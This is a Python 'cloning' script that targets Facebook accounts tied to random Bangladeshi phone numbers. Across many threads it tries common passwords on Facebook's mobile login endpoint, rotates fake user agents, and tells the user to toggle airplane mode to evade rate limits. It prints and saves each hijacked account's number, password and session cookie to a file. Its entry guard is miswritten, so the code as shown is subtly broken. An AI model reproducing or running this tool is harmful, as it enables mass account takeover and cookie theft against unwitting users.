import os, time, sys, uuid, random, requests, re
from concurrent.futures import ThreadPoolExecutor

# Color
G = '\033[1;32m'; R = '\033[1;31m'; Y = '\033[1;33m'; W = '\033[1;37m'
loop = 0
ok = []

def banner():
    os.system('clear')
    print(f"""{G}
    ███    ███  ███████  ████████  █████  
    ████  ████  ██          ██    ██   ██ 
    ██ ████ ██  █████       ██    ███████ 
    ██  ██  ██  ██          ██    ██   ██ 
    ██      ██  ███████     ██    ██   ██ 
{W}×××××××××××××××××××××××××××××××××××××××××××××××××
 [✓] STATUS    : 100,000 LIMIT OPTIMIZED
 [✓] METHOD    : TOUCH-ASYNC (ULTRA)
 [✓] PASSWORDS : 15+ PRO LIST
{W}×××××××××××××××××××××××××××××××××××××××××××××××××""")

def main():
    banner()
    print(f'{G}[1] START 100,000 LIMIT CLONING')
    print(f'[0] EXIT')
    opt = input(f'{G}[?] CHOOSE : {W}')
    if opt == '1': cloning()
    else: exit()

def cloning():
    banner()
    code = input(f'{G}[+] BD CODE (017/019/016): {W}')
    limit = 100000 # আপনার রিকোয়েস্ট অনুযায়ী ১ লক্ষ লিমিট
    
    # ল্যাপটপের পাওয়ারের জন্য থ্রেড ৪০-৫০ রাখা ভালো
    with ThreadPoolExecutor(max_workers=45) as submission:
        banner()
        print(f'{G}[+] TOTAL LIMIT: {limit} | CODE: {code}')
        print(f'{Y}[!] TIP: AIRPLANE MODE ON/OFF EVERY 1000 SCANS')
        print(f'{W}×××××××××××××××××××××××××××××××××××××××××××××××××\n')
        for _ in range(limit):
            uid = code + "".join(random.choices("0123456789", k=8))
            submission.submit(engine, uid, limit)

def engine(uid, limit):
    global loop, ok
    sys.stdout.write(f'\r{G}[MALEK-RUN] {loop}/{limit} [OK:{len(ok)}]'); sys.stdout.flush()
    
    # পাওয়ারফুল পাসওয়ার্ড লিস্ট
    pws = [uid, uid[6:], uid[:6], 'bangladesh', '@@##1122', '778899', 'i love you', 'khan123', 'mim123', 'jannatul', '102030', '55667788', 'Allah123', 'password', 'freefire']
    
    for pas in pws:
        if len(pas) < 6: continue
        session = requests.Session()
        ua = f"Mozilla/5.0 (Linux; Android {random.randint(10,13)}; SM-A{random.randint(10,70)}5F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(110,126)}.0.0.0 Mobile Safari/537.36"
        
        try:
            free_page = session.get('https://m.facebook.com/login/').text
            log_data = {
                "lsd": re.search('name="lsd" value="(.*?)"', str(free_page)).group(1),
                "jazoest": re.search('name="jazoest" value="(.*?)"', str(free_page)).group(1),
                "email": uid, "pass": pas, "login": "Log In"
            }
            header = {
                'Host': 'm.facebook.com', 'x-fb-lsd': log_data['lsd'], 'user-agent': ua,
                'accept': '/', 'origin': 'https://m.facebook.com', 'referer': 'https://m.facebook.com/login/'
            }
            
            post = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100', data=log_data, headers=header)
            
            if 'c_user' in session.cookies.get_dict():
                ok.append(uid)
                print(f'\n{G}[MALEK-OK💚] {uid} | {pas}')
                cookie = "; ".join([f"{k}={v}" for k, v in session.cookies.get_dict().items()])
                print(f'{Y}[🍪] COOKIE = {cookie}\n')
                # সেভ করার পাথ
                open('/sdcard/MALEK_100K_OK.txt', 'a').write(f'{uid}|{pas}|{cookie}\n')
                break
        except: pass
    loop += 1

if _name_ == "_main_":
    main()
